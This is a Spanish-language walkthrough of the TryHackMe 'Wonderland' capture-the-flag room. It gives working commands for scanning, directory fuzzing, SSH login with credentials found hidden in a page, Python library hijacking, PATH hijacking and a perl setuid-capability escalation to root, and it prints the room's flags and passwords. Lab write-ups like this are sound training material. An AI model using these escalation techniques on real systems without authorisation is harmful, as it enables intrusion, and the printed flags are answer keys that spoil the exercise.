@@ -1,0 +1,104 @@
+TryHackMe - Wonderland
+
+Escaneo NMAP:
+
+nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn 10.10.217.39 -oN wonderlandnmap
+
+Puertos abiertos encontrados: 22/tcp: SSH 7.6 y 80/tcp: Servidor HTTP. Dado que el puerto 80 indica la presencia de un servidor web, ingresamos la IP en el navegador con la frase: "Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English). Luego, procedemos a fuzzear la IP:
+
+wfuzz --hc 404 -c -u http://10.10.217.39/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+El resultado es /r, y encontramos otra frase: "Would you tell me, please, which way I ought to go from here?"
+
+Realizamos fuzzing nuevamente, esta vez después del directorio "/r":
+
+wfuzz --hc 404 -c -u http://10.10.217.39/r/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+
+El resultado es /a, y encontramos otra frase: "That depends a good deal on where you want to get to," said the Cat.
+
+Procedemos a fuzzear de la misma forma, hasta formar la palabra /r/a/b/b/i/t, donde encontramos una última frase y nada más.
+
+Al acceder al código fuente del último directorio encontrado "/t", podemos ver un usuario y contraseña:
+
+<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
+
+Usuario y contraseña: alice:HowDothTheLittleCrocodileImproveHisShiningTail
+
+Utilizamos estos credenciales para acceder al puerto 22 SSH:
+
+ssh alice@10.10.217.39
+
+Dentro del puerto SSH encontramos los siguientes archivos:
+- root.txt
+- walrus_and_the_carpenter.py
+
+El archivo root.txt requiere permisos elevados, y walrus_and_the_carpenter.py es un código Python que imprime partes de un poema de manera aleatoria.
+
+Ejecutamos el siguiente comando para identificar los privilegios del usuario sobre los archivos:
+
+sudo -l
+
+Obtenemos la siguiente salida:
+User alice may run the following commands on wonderland:
+(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+Por lo tanto, podemos realizar un bypass ejecutando código dentro del script de Python. Creamos un nuevo archivo Python con el siguiente código:
+
+import os
+os.system("/bin/bash")
+
+Guardamos el archivo como "random.py" y reemplazamos "import random" en el archivo Python original. Luego, ejecutamos:
+
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+Dentro de la carpeta del usuario "/rabbit", encontramos un archivo llamado "teaParty". Creamos un servidor Python para obtener ese archivo:
+
+python3 -m http.server 5000
+
+Una vez obtenido el archivo "teaParty", lo examinamos con el comando "strings":
+
+strings teaParty
+
+Entre los resultados, encontramos lo siguiente relevante:
+
+/bin/echo -n 'Probably by ' && date --date='next hour' -R
+
+Esto indica que el usuario "hatter" está ejecutando este código en Bash. Similar al caso anterior, cambiaremos "date" con un bypass para obtener más privilegios como "hatter".
+
+Creamos un archivo llamado "date" con el siguiente contenido:
+
+#!/bin/bash
+/bin/bash
+
+Luego, le otorgamos permisos y lo agregamos al PATH:
+
+chmod 777 date
+export PATH=.:$PATH
+
+Ejecutamos "teaParty":
+
+./teaParty
+
+Ahora somos el usuario "hatter". Dentro de la carpeta de "hatter", encontramos un archivo llamado "password.txt":
+
+password.txt
+WhyIsARavenLikeAWritingDesk?
+
+Desde el usuario hatter aplicamos el siguiente comando:
+
+getcap -r / 2>/dev/null
+
+Esto nos muestra las capacidades de ejecución de archivos en Linux, y encontramos las siguientes capacidades:
+
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+
+Al ver que el usuario tiene permisos en /usr/bin/perl, nos dirigimos a GTFOBins para buscar una escalada de privilegios en capacidades. Utilizamos el siguiente comando para escalar privilegios a root:
+
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+Buscando entre los archivos, encontramos las flags necesarias:
+
+Root: thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
+Usuario: thm{"Curiouser and curiouser!"}
